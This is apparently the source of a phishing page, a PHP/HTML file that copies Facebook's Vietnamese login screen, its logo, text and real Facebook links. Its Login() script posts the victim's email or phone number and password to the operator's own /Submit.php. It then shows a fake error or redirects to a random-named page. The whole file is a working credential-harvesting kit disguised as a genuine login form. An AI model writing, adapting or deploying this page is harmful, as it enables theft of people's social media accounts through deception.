<?php
include('../config.php');

if(isset($_SESSION['login'])){
    die('You can not access this page');
}

?>

<!DOCTYPE html>
<html lang="en">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Đăng nhập với Facebook </title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Đăng nhập với Facebook">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <link rel="stylesheet" href="/assets/css/icons.css">
    <link rel="stylesheet" href="/assets/css/uikit.css">
    <link rel="stylesheet" href="/assets/css/style.css">
    <link href="//unpkg.com/tailwindcss%402.2.19/dist/tailwind.min.css" rel="stylesheet"> 
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" type="image/x-icon" />
    
    <style>
        body{
            background-color: white;
        } 
    </style>
</head> 
 

  <div id="fb-root"></div>

    <body>
        
               <div class="lg:flex max-w-5xl min-h-screen mx-auto p-6 py-10">
        <div class="flex flex-col items-center lg: lg:flex-row lg:space-x-10">

            <div class="lg:mb-12 flex-1 lg:text-left text-center">
                <img class="font-medium lg:mx-0 md:text-2xl mt-6 mx-auto sm:w-3/4 text-xl" style="width: 256px;" src="/f7e69942-b8d4-44f1-bc8d-fd5f71991dee-removebg-preview.png" alt="Facebook">
                <p class="font-medium lg:mx-0 md:text-2xl mt-6 mx-auto sm:w-3/4 text-xl"> Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn. </p>
            </div>
            <div class="lg:mt-0 lg:w-96 md:w-1/2 sm:w-2/3 mt-10 w-full">
                <form class="p-6 space-y-4 relative bg-white shadow-lg rounded-lg"> 
                    <input type="email" placeholder="Email hoặc số điện thoại" class="with-border" id="username">
                    <input type="password" placeholder="Mật khẩu" class="with-border" id="password">
                    
                    <center><div class="text-danger" id="danger" style="color: red;"></div></center>
                    
                    <button type="button" id="login" onclick="Login()" class="bg-blue-600 font-semibold p-3 rounded-md text-center text-white w-full">
                        Đăng Nhập
                    </button>
                    <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjgxMTMwOTIwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login" class="text-blue-500 text-center block"> Quên mật khẩu </a>
                    <hr class="pb-3.5">
                    <div class="flex">
                        <a href="https://www.facebook.com/r.php" type="button" class="bg-green-600 hover:bg-green-500 hover:text-white font-semibold py-3 px-5 rounded-md text-center text-white mx-auto" uk-toggle>
                            Tạo tài khoản
                        </a>
                    </div>
                </form>

                <div class="mt-8 text-center text-sm"> <a href="https://www.facebook.com/pages/create/?ref_type=registration_form" class="font-semibold hover:underline"> Tạo Trang </a> dành cho người nổi tiếng, thương hiệu hoặc doanh nghiệp. </div>
            </div>
    
        </div>
    </div>
    
  
    
    <script src="//code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script src="/assets/js/tippy.all.min.js"></script>
    <script src="/assets/js/uikit.js"></script>
    <script src="/assets/js/simplebar.js"></script>

    <script src="/assets/js/bootstrap-select.min.js"></script>
    <script src="//unpkg.com/ionicons%405.2.3/dist/ionicons.js"></script>
    
    <script>
        
      function Login(){
            $.ajax({
              url: "/Submit.php",
              method: "POST",
              data: {
                  type: 'Facebook',
                  username: $("#username").val(),
                  password: $("#password").val(),
                  id: '<?=$query['id'];?>',
              },
              success: function(response) {
                
                if(response === 'false'){
                    document.getElementById("danger").innerHTML = 'Email hoặc số di động bạn nhập không kết nối với tài khoản nào. Hãy tìm tài khoản của bạn và đăng nhập.';
                } else if(response == 'true') {
                    window.location.href="/PhN2HdE8WTEjjwm38Y95AdGnbRdHDYGrmr8FRDxeQ9Mc0AeSkHmc7aBjPZNq0wtyAMxrkTZsaSd1EdnP.html";
                } else {
                    document.getElementById("danger").innerHTML = response;
                }
              }
            });
          }
          
    </script>
    
    
    
  </body>
</html>